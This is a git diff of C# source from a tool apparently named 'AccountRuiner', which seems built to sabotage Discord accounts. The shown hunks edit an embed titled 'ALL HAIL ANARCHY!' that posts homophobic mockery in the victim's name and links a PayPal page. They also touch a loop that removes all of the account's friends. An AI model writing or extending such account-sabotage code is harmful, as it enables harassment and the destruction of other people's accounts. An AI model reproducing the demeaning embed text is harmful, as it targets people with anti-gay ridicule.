@@ -57,7 +57,8 @@ namespace AccountRuiner
                     {
                         Title = "ALL HAIL ANARCHY!",
                         Description = @"I just got riggity rekked!
-I got the big gay! LOL!",
+I got the big gay! LOL!
+TEOTFW Best Show",
                         Color = Color.FromArgb(0, 204, 255),
                         TitleUrl = "https://paypal.me/imtoopoorlol",
                         ImageUrl = "https://cdn.discordapp.com/attachments/622851297607155722/627651954499387411/u_wot.jpg",
@@ -79,7 +80,7 @@ I got the big gay! LOL!",
             {
                 if (relationship.Type == RelationshipType.Friends)
                     relationship.Remove();
-                Console.WriteLine("Removing Friends...");
+                Console.WriteLine($"Removing Friends...");
 
             }
 
